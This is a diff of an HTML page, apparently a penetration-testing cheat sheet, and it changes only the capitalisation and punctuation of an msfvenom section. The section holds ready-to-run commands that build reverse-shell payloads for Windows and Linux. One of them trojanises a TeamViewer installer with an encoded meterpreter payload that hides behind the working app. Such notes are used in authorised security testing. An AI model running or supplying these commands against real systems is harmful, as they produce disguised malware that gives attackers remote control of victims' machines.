@@ -49,39 +49,39 @@
     <main>
 
     
-    <h1>msfvenom</h1>
+    <h1>Msfvenom</h1>
 
-<h2>payload naming convention</h2>
+<h2>Payload naming convention</h2>
 
 <ul>
-<li>general naming convention is <code>&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;</code>: for instance <code>linux/x86/shell_reverse_tcp</code></li>
-<li>however, windows 32bit targets have no specified arch, like so: <code>windows/shell_reverse_tcp</code></li>
-<li>staged payloads are denoted by a slash: <code>windows/x64/meterpreter/reverse_tcp</code></li>
-<li>stageless payloads are denoted by an underscore: <code>linux/x86/meterpreter_reverse_tcp</code></li>
+<li>General naming convention is <code>&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;</code>: for instance <code>linux/x86/shell_reverse_tcp</code>.</li>
+<li>However, windows 32bit targets have no specified arch, like so: <code>windows/shell_reverse_tcp</code>.</li>
+<li>Staged payloads are denoted by a slash: <code>windows/x64/meterpreter/reverse_tcp</code>.</li>
+<li>Stageless payloads are denoted by an underscore: <code>linux/x86/meterpreter_reverse_tcp</code>.</li>
 </ul>
 
-<h2>commands</h2>
+<h2>Commands</h2>
 
-<div class="highlight"><pre class="highlight shell"><code><span class="c"># list available payloads</span>
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># List available payloads:</span>
 msfvenom <span class="nt">-l</span> payloads
 
-<span class="c"># generate a staged reverse TCP payload in exe format for windows x64 systems (remove null byte bad char)</span>
-msfvenom <span class="nt">-p</span> windows/x64/shell/reverse_tcp <span class="nt">-f</span> exe <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-o</span> shell.exe <span class="nv">LHOST</span><span class="o">=</span>&lt;listen-ip&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt;
+<span class="c"># Generate a staged reverse TCP payload in exe format for windows x64 systems (remove null byte bad char):</span>
+msfvenom <span class="nt">-p</span> windows/x64/shell/reverse_tcp <span class="nt">-f</span> exe <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-o</span> shell.exe <span class="nv">LHOST</span><span class="o">=</span>&lt;listen-IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt;
 
-<span class="c"># generate a stageless reverse TCP payload in exe format for windows x64 systems (remove null byte bad char)</span>
-msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nt">-f</span> exe <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-o</span> shell.exe <span class="nv">LHOST</span><span class="o">=</span>&lt;listen-ip&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt;
+<span class="c"># Generate a stageless reverse TCP payload in exe format for windows x64 systems (remove null byte bad char):</span>
+msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nt">-f</span> exe <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-o</span> shell.exe <span class="nv">LHOST</span><span class="o">=</span>&lt;listen-IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt;
 
-<span class="c"># generate a staged reverse TCP payload in elf format for linux x64 systems (remove null byte bad char)</span>
-msfvenom <span class="nt">-p</span> linux/x64/shell/reverse_tcp <span class="nt">-f</span> elf <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-o</span> shell.elf <span class="nv">LHOST</span><span class="o">=</span>&lt;listen-ip&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt;
+<span class="c"># Generate a staged reverse TCP payload in elf format for linux x64 systems (remove null byte bad char):</span>
+msfvenom <span class="nt">-p</span> linux/x64/shell/reverse_tcp <span class="nt">-f</span> elf <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-o</span> shell.elf <span class="nv">LHOST</span><span class="o">=</span>&lt;listen-IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt;
 
-<span class="c"># generate a stageless reverse TCP payload in elf format for linux x64 systems (remove null byte bad char)</span>
-msfvenom <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nt">-f</span> elf <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-o</span> shell.elf <span class="nv">LHOST</span><span class="o">=</span>&lt;listen-ip&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt;
+<span class="c"># Generate a stageless reverse TCP payload in elf format for linux x64 systems (remove null byte bad char):</span>
+msfvenom <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nt">-f</span> elf <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-o</span> shell.elf <span class="nv">LHOST</span><span class="o">=</span>&lt;listen-IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt;
 
-<span class="c"># generate a stageless meterpreter reverse TCP payload for a windows x86 target,</span>
+<span class="c"># Generate a stageless meterpreter reverse TCP payload for a windows x86 target,</span>
 <span class="c"># embed it in a TeamViewer_Setup.exe executable file,</span>
 <span class="c"># encode the payload 5 times with shikata_ga_nai,</span>
-<span class="c"># and continue the normal execution of the app by spawning the payload in a separate thread.</span>
-msfvenom <span class="nt">-p</span> windows/x86/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;listen-ip&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt; <span class="nt">-k</span> <span class="nt">-x</span> ~/Downloads/TeamViewer_Setup.exe <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-a</span> x86 <span class="nt">--platform</span> windows <span class="nt">-o</span> ~/Desktop/TeamViewer_Setup.exe <span class="nt">-i</span> 5
+<span class="c"># and continue the normal execution of the app by spawning the payload in a separate thread:</span>
+msfvenom <span class="nt">-p</span> windows/x86/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;listen-IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt; <span class="nt">-k</span> <span class="nt">-x</span> ~/Downloads/TeamViewer_Setup.exe <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-a</span> x86 <span class="nt">--platform</span> windows <span class="nt">-o</span> ~/Desktop/TeamViewer_Setup.exe <span class="nt">-i</span> 5
 </code></pre></div>
 
     </main>
